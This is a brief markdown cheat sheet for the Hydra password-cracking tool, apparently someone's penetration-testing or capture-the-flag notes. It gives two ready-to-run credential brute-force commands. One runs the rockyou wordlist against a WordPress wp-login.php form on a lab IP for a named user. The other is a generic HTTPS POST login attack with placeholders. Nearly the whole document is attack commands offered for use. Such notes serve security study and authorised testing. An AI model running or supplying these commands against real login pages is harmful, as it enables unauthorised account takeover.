# hydra

## Hydra Usage

### Post attack

```csharp
hydra -l notch -P /usr/share/wordlists/rockyou.txt 10.10.10.37 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

``

``

`Https POST`

```shell
hydra -L users -p PASSWORD  IP https-post-form "/auth/login:module=auth&action=login&username=^USER^&password=^PASS^:Invalid" -fV 
```
